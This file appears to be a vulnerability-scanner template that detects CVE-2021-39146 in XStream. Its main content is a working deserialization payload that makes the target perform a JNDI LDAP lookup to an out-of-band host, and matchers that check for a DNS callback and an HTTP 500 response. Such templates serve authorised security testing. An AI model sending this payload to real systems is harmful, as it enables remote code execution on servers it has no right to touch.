id: CVE-2021-39146

info:
  name: CVE-2021-39146
  author: pwnhxl
  severity: high
  description: The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.
  reference:
    - https://x-stream.github.io/CVE-2021-39146.html
  tags: cve,cve-2021,xstream,deserialization,rce

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <sorted-set>
          <javax.naming.ldap.Rdn_-RdnEntry>
            <type>test</type>
            <value class='javax.swing.MultiUIDefaults' serialization='custom'>
              <unserializable-parents/>
              <hashtable>
                  <default>
                    <loadFactor>0.75</loadFactor>
                    <threshold>525</threshold>
                  </default>
                  <int>700</int>
                  <int>0</int>
              </hashtable>
              <javax.swing.UIDefaults>
                  <default>
                    <defaultLocale>zh_CN</defaultLocale>
                    <resourceCache/>
                  </default>
              </javax.swing.UIDefaults>
              <javax.swing.MultiUIDefaults>
                  <default>
                    <tables>
                    <javax.swing.UIDefaults serialization='custom'>
                      <unserializable-parents/>
                      <hashtable>
                        <default>
                          <loadFactor>0.75</loadFactor>
                          <threshold>525</threshold>
                        </default>
                        <int>700</int>
                        <int>1</int>
                        <string>lazyValue</string>
                        <javax.swing.UIDefaults_-ProxyLazyValue>
                          <className>javax.naming.InitialContext</className>
                          <methodName>doLookup</methodName>
                          <args>
                            <string>ldap://{{interactsh-url}}/#evil</string>
                          </args>
                        </javax.swing.UIDefaults_-ProxyLazyValue>
                      </hashtable>
                      <javax.swing.UIDefaults>
                        <default>
                          <defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>
                          <resourceCache/>
                        </default>
                      </javax.swing.UIDefaults>
                    </javax.swing.UIDefaults>
                    </tables>
                  </default>
              </javax.swing.MultiUIDefaults>
            </value>
          </javax.naming.ldap.Rdn_-RdnEntry>
          <javax.naming.ldap.Rdn_-RdnEntry>
            <type>test</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
              <m__obj class='string'>test</m__obj>
            </value>
          </javax.naming.ldap.Rdn_-RdnEntry>
        </sorted-set>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: status
        status:
          - 500
